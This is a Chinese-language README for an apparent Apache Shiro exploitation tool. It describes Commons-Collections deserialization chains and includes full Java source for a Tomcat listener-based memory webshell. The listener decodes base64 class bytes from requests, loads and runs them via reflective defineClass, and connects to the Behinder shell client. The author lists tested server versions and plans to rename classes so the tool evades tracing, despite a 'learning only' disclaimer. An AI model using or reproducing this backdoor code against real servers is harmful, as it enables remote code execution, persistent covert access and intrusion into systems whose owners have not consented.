# Dr4gon's Sword
- [Dr4gon's Sword](#dr4gon-s-sword)
  * [Shiro](#shiro)
    + [使用方法](#----)
    + [利用链](#---)
    + [内存马和回显方法](#--------)
    + [本地测试过的中间件版本](#-----------)
- [未来准备更新(可能)](#----------)

版本0.0.1,目前只有Shiro,刚入门JAVA,后续随着学习会加入更多漏洞

仅供交流学习漏洞利用方式,请勿用于非法用途

## Shiro

### 使用方法

点击Inject进行注入,然后才能连接冰蝎或者执行命令

连接冰蝎的时候加get参数stage=s

![2](2.png)

![1](1.png)

### 利用链

Commons-CollectionsK1_1 和K1的区别基本上只是我用的是InstantiateTransformer,K1用的是InvokerTransformer(大概是CC3和CC6分别缝合TemplatesImpl以后的区别)

总结:几乎一样

### 内存马和回显方法

使用listener注入,相比于[j1anFen](https://github.com/j1anFen)师傅用的servlet来说,不会被shiro拦,只要tomcat能解析的路径就能上线内存马,不用怕shirofilter匹配*的情况

并且defineclass直接加载了pageContext类(有的时候没有依赖导致注入失败)

另外我这边同一个listener同时实现命令执行回显和内存马,命令执行回显可以GBK编码

核心逻辑为实现一个Listener同时继承AbstractTranslet类并且实现ServletRequestListener接口来加载任意类并调用方法

```JAVA
public class Init extends AbstractTranslet implements ServletRequestListener  {
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException { }
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException { }
    public Init() throws Exception {
        super();
        super.namesArray = new String[]{"ccdr4gon"};
        WebappClassLoaderBase webappClassLoaderBase =(WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
        StandardContext standardCtx = (StandardContext)webappClassLoaderBase.getResources().getContext();
        standardCtx.addApplicationEventListener(this);
    }

    @Override
    public void requestDestroyed(ServletRequestEvent sre) {}
    @Override
    public void requestInitialized(ServletRequestEvent sre) {
        try {
            RequestFacade requestfacade= (RequestFacade) sre.getServletRequest();
            Field field = requestfacade.getClass().getDeclaredField("request");
            field.setAccessible(true);
            Request request = (Request) field.get(requestfacade);
            if (request.getParameter("stage").equals("init")) {
                StringBuilder sb = new StringBuilder("");
                BufferedReader br = request.getReader();
                String str;
                while ((str = br.readLine()) != null) {
                    sb.append(str);
                }
                byte[] payload = Base64.getDecoder().decode(sb.toString());
                Method defineClass = Class.forName("java.lang.ClassLoader").getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
                defineClass.setAccessible(true);
                Class clazz = (Class) defineClass.invoke(Thread.currentThread().getContextClassLoader(), payload, 0, payload.length);
                clazz.newInstance();
            }
        }catch (Exception ignored){ }
    }
}
```

### 本地测试过的中间件版本

Tomcat 8.5.51 √

Springboot 2.3.5 √  似乎对应 tomcat-embed-core 9.0.39

# 未来准备更新(可能)

- 把类名改了,总感觉有可能会被溯源
- shiro
  - 自定义Behinder的pass(现在还只能是默认的rebeyond,太惨了)
  - aes gcm加密方式(说实话也不知道有没有用)
  - commons-collections4的利用链

- fastjson

- weblogic等等更多以后准备学习的JAVA漏洞
- okhttp库response的获取有点迷,似乎只能获取一次,目前处于能用就行的丑陋状态,之后看看怎么改改

